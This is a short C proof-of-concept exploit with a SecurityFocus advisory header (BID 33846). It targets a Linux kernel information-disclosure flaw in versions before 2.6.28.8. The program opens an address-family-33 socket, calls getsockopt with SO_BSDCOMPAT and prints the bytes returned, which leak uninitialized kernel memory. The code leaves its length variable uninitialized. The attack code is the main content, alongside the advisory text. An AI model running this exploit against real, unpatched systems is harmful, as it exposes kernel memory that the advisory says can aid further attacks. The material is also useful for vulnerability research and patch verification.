/*
source: http://www.securityfocus.com/bid/33846/info

The Linux Kernel is prone to an information-disclosure vulnerability because it fails to properly initialize certain memory before using using it in a user-accessible operation.

Successful exploits will allow attackers to view portions of kernel memory. Information harvested may be used in further attacks.

Versions prior to Linux Kernel 2.6.28.8 are vulnerable.
*/


int main(void)
    {
    	unsigned char buf[4] = { 0, 0, 0, 0 };
    	int len;
    	int sock;
    	sock = socket(33, 2, 2);
    	getsockopt(sock, 1, SO_BSDCOMPAT, &buf, &len);
    	printf("%x%x%x%x\n", buf[0], buf[1], buf[2], buf[3]);
    	close(sock);
    }